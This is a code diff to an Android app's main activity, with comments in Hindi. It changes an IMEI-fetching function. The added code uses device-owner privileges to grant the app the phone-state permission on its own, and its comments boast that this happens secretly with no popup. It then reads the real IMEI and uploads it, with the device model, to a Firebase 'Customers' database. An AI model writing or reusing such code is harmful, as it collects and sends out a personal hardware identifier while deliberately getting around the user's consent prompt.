@@ -161,12 +161,20 @@ public class MainActivity extends AppCompatActivity {
         barcodeLauncher.launch(options);
     }
 
-        // --- नया: क्रैश-प्रूफ IMEI निकालने वाला सही फंक्शन ---
+    // --- नया: बिना परमिशन मांगे ऑटो-ग्रांट (Auto-Grant) और असली IMEI निकालने वाला फंक्शन ---
     private String getSafeImei() {
         String imei = "N/A (Running Device)";
         try {
             if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
-                // सही तरीका: TelephonyManager का इस्तेमाल करें
+                
+                // 1. जादू: खुद को छुपकर READ_PHONE_STATE परमिशन देना (कोई पॉपअप नहीं आएगा)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    dpm.setPermissionGrantState(adminComponent, getPackageName(),
+                            android.Manifest.permission.READ_PHONE_STATE,
+                            DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED);
+                }
+
+                // 2. परमिशन मिलने के बाद असली IMEI निकालना
                 android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     imei = tm.getImei();
@@ -188,11 +196,11 @@ public class MainActivity extends AppCompatActivity {
                     String deviceModel = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
                     boolean isFullySecure = dpm.isDeviceOwnerApp(getPackageName()); 
 
-                    String fetchedImei = getSafeImei(); // <-- नया: IMEI यहाँ से निकाला जाएगा
+                    String fetchedImei = getSafeImei(); // अब यह असली IMEI लाएगा!
 
                     Map<String, Object> data = new HashMap<>();
                     data.put("model", deviceModel);
-                    data.put("imei", fetchedImei); // <-- नया: Firebase पर IMEI सेव हो जाएगा
+                    data.put("imei", fetchedImei); 
                     data.put("security_level", isFullySecure ? "Device Owner (100%)" : "Admin + Overlay (Running)");
 
                     db.collection("Customers").document(sessionId).update(data)
